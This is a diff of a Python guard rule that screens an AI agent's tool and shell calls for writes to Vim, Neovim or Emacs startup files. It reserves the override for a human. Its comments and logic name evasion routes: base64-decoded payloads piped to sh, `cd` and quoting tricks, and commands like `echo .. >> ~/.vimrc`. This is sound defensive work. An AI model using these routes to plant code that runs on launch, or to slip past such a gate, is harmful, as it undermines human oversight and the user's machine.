+                    (kn.endswith("dir") or kn.endswith("directory") or kn == "folder")
+                    and not re.search(r"log|tmp|temp|cache|out|output|dest|target|backup", kn))
+                if ok and isinstance(_v, str) and _v:
+                    mcp_cwd = _v           # the runner's own cwd (QA rounds 5-7)
+                    break
+            if mcp_cwd is not ev.cwd:
+                break
+        for _sc in (shell_cmd or []):
+            sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                             args={"command": _sc}, cwd=mcp_cwd)
+            d = rule_editor_startup_protect(sub, policy)
+            if d is not None:
+                return Decision(d.action, d.rule, f"MCP tool '{ev.tool}' runs a "
+                                "command that writes an editor init file. " + d.message)
+        # QA round 4: any other command-shaped string leaf of a non-messaging
+        # call (`write_stdin{chars}`, `pty__write{data}`, computer-use
+        # `type{text}`) is judged as a shell command too.
+        _p0 = _path(ev) or str(a0.get("relative_path") or a0.get("relativePath") or "")
+        _own_ungated_target = bool(_p0 and "\n" not in _p0
+                                   and not patterns.editor_startup_path_hit(_p0))
+        # MCP git servers: a work-tree-writing tool on a repo rooted at a
+        # gated parent (`git_checkout{repo_path: ~}` -- QA round 8).
+        if tool_words & {"checkout", "pull", "merge", "reset", "restore", "switch", "apply",
+                         "stash", "rebase", "clone"} and "git" in tool_words:
+            for _k in ("repo_path", "repoPath", "repository", "path", "cwd", "directory",
+                       "target_path", "local_path", "repo", "working_dir", "workdir",
+                       "workingDir", "dir", "repository_path", "worktree"):
+                _v = a0.get(_k)
+                if isinstance(_v, str) and _v and (
+                        patterns._ed_is_gated_parent(_v) or patterns.editor_startup_path_hit(_v)):
+                    p = _v
+                    if os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP") or \
+                            _editor_startup_allowed_by_policy(cfg, p):
+                        return None
+                    return _finish(Decision(action, "editor-startup-protect",
+                                     f"MCP git tool '{ev.tool}' updates a work tree at '{_v}' "
+                                     "-- files it checks out land in editor startup/init "
+                                     "locations, which the editor runs as code on its next "
+                                     "launch. Confirm with AEGIS_ALLOW_EDITOR_STARTUP=1; a "
+                                     "spawned agent cannot."))
+        # MCP move/copy/link whose destination IS a gated parent
+        # (`move_file{source: d/.config, destination: ~/.config}` -- QA r10).
+        if tool_words & {"move", "copy", "rename", "symlink", "link", "mv", "cp", "duplicate"}:
+            for _k, _v in a0.items():
+                if isinstance(_v, str) and _v and _http_rc_words(_k) & {
+                        "destination", "dest", "target", "to", "new", "dst", "link"}:
+                    try:
+                        _gp = patterns._ed_is_gated_parent(_v.strip())
+                    except Exception:
+                        _gp = True
+                    if _gp:
+                        if os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP") or \
+                                _editor_startup_allowed_by_policy(cfg, _v):
+                            return None
+                        return _finish(Decision(action, "editor-startup-protect",
+                                         f"MCP tool '{ev.tool}' moves/copies/links a "
+                                         f"directory onto '{_v}', a parent of editor "
+                                         "startup/init locations the editor runs as code. "
+                                         "Confirm with AEGIS_ALLOW_EDITOR_STARTUP=1; a "
+                                         "spawned agent cannot."))
+        # An ordinary file write to a non-gated target: its content is data,
+        # not a command (QA round 8: a README quoting `echo .. >> ~/.vimrc`).
+        _file_writer = bool(tool_words & _ED_FILE_TOOL_WORDS) and not (
+            tool_words & (_ED_STRONG_SHELL_WORDS | {"term", "input", "keys", "type"}))
+        if not (tool_words & _ED_MESSAGING_WORDS) and not (_own_ungated_target and _file_writer):
+            skip = set()
+            # Prose-shaped keys (a commit message, a search query) are not
+            # commands (QA round 6 false positives).
+            skip = set(skip) | {k for k in a0 if _http_rc_words(k) & _ED_PROSE_KEY_WORDS}
+            for leaf in _flatten_strings({k: v for k, v in a0.items() if str(k) not in skip}):
+                leaf = str(leaf)
+                if not re.search(r"\S\s+\S", leaf) or len(leaf) > 200000:
+                    continue
+                if (patterns.editor_startup_shell_path_hit(leaf)
+                        or patterns.editor_startup_placement_hit(leaf)) and \
+                        not patterns.editor_startup_shell_only_reads(leaf):
+                    sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                                     args={"command": leaf}, cwd=ev.cwd)
+                    d = rule_editor_startup_protect(sub, policy)
+                    if d is not None:
+                        return Decision(d.action, d.rule, f"MCP tool '{ev.tool}' "
+                                        "carries a command that writes an editor "
+                                        "init file. " + d.message)
+        has_content = _editor_startup_has_content_key(ev.args or {})
+        if _http_rc_mcp_read_only(ev) and not has_content:
+            return None
+        words = _http_rc_words(str(ev.tool or "").split("__")[-1])
+        if (words & _ED_DELETE_WORDS and not (words & (_HTTP_RC_WRITE_WORDS - {"set"}))
+                and not has_content and len(words - _ED_DELETE_WORDS - {"file", "files", "dir", "directory", "path", "item", "items"}) == 0):
+            return None
+        p = _editor_startup_mcp_target(ev)
+        if not p:
+            _p0 = _path(ev) or str((ev.args or {}).get("relative_path")
+                                    or (ev.args or {}).get("relativePath") or "")
+            if (_p0 and ev.cwd and "\n" not in _p0
+                    and not re.match(r"^(?:[/\\~]|[A-Za-z]:|file:)", _p0)
+                    and patterns.editor_startup_path_hit(str(ev.cwd).rstrip("/\\") + "/" + _p0)):
+                p = _p0                    # QA round 4: cwd-relative MCP path
+            else:
+                return None
+    elif ev.action in (ActionClass.EDIT, ActionClass.WRITE):
+        p = _path(ev)
+        hit = bool(p and patterns.editor_startup_path_hit(p))
+        if not hit and p and ev.cwd and not re.match(r"^(?:[/\\~]|[A-Za-z]:)", p):
+            # QA round 3: a relative path inside a gated cwd.
+            hit = patterns.editor_startup_path_hit(str(ev.cwd).rstrip("/\\") + "/" + p)
+        if not hit:
+            return None
+    elif _is_shell(ev):
+        cmd = _shell_scan(ev)
+        raw = _cmd(ev)
+        named = (patterns.editor_startup_shell_path_hit(cmd, ev.cwd)
+                 or patterns.editor_startup_shell_path_hit(raw, ev.cwd))
+        # The placement analyzer tokenizes itself; give it renderings kept
+        # APART by newlines -- `scan_surface`'s space-joined form merged one
+        # command's tail into the next (QA round 5).
+        # Each rendering analyzed with FRESH cwd state: run back to back, a
+        # relative `cd ..` would apply twice (QA round 10).
+        _pc, _uc = [], False
+        _cd_dirs = [m.group(2) for m in patterns._ED_CD_RE.finditer(raw)][:8]
+        for _r in dict.fromkeys(normalize.scan_surface(raw, sep="\x1e").split("\x1e")):
+            if _r != raw and re.sub(r"[\s'\"$]", "", _r) == re.sub(r"[\s'\"$]", "", raw):
+                # The quote-stripped copy: the tokenizer already handles
+                # quotes (`c''p`), and stripping them changes what `bash -c
+                # 'cd /tmp && git pull'` runs (QA round 12 false positive).
+                continue
+            if _r != raw and _r.strip() and _r.strip() in raw:
+                # An extracted body (`bash -c 'git pull'`): the inline analysis
+                # of the raw command already judged it WITH its `cd` state
+                # (QA round 11 false positive).
+                continue
+            # A decoded payload (base64 | sh): judge it in the session cwd
+            # and in every directory the raw command `cd`s into.
+            # A rendering with its own `cd` (a quote-stripped copy of raw)
+            # carries its own state; only a cd-free decoded payload borrows
+            # the raw command's `cd` targets.
+            _cws = [ev.cwd] if (_r == raw or patterns._ED_CD_RE.search(_r)) else [ev.cwd] + [
+                patterns._ed_dotdot_normalize(patterns._ed_join(ev.cwd, x)) for x in _cd_dirs]
+            for _cw in dict.fromkeys(_cws):
+                try:
+                    _p1, _u1 = patterns.editor_startup_placement_targets(_r, _cw)
+                except Exception:
+                    _p1, _u1 = [], True
+                _pc += _p1
+                _uc = _uc or _u1
+        _pr, _ur = patterns.editor_startup_placement_targets(raw, ev.cwd)
+        bulk = _uc or _ur
+        named = named or bool(_pc or _pr)
+        if not (named or bulk):
+            return None
+        if not bulk and (patterns.editor_startup_shell_only_reads(cmd)
+                         and patterns.editor_startup_shell_only_reads(raw)):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP")
+                or (not bulk and _editor_startup_shell_allowed(cfg, raw, ev.cwd))):
+            return None
+        return _finish(Decision(action, "editor-startup-protect",
+                         "An editor startup/init file or runtime directory "
+                         "(~/.vimrc, ~/.vim/, ~/.config/nvim/, ~/.emacs.d/, "
+                         "...) is being written from a shell -- the editor "
+                         "executes it as code on its next launch, including "
+                         "the one `git commit`/`git rebase -i` starts. A human "
+                         "may append '# aegis-allow', or set "
+                         "AEGIS_ALLOW_EDITOR_STARTUP=1; a spawned agent "
+                         "cannot."))
+    else:
+        return None
+
+    if os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP") or _editor_startup_allowed_by_policy(cfg, p):
+        return None
+    return _finish(Decision(action, "editor-startup-protect",
+                     f"'{p}' is an editor startup/init file or runtime "
+                     "directory -- Vim/Neovim/Emacs (or Kakoune/micro/Helix) "
+                     "executes it as code, with the human's privileges, on "
+                     "its next launch, including the one `git commit`/`git "
+                     "rebase -i` starts. Review the change, then confirm "
+                     "with AEGIS_ALLOW_EDITOR_STARTUP=1; a spawned agent "
+                     "cannot."))
+
+
 _CORE_RULES = (
     rule_attest_session,
     rule_containment,
@@ -14564,6 +15300,8 @@ _CORE_RULES = (
     rule_agent_exec_config_protect,
     # Content-gated ASK; same tail-block reason as npmrc/repl_rc above.
     rule_http_client_config_protect,
+    # Any-write ASK; same tail-block reason as above.
+    rule_editor_startup_protect,
     rule_agent_rules_protect,
 )
 
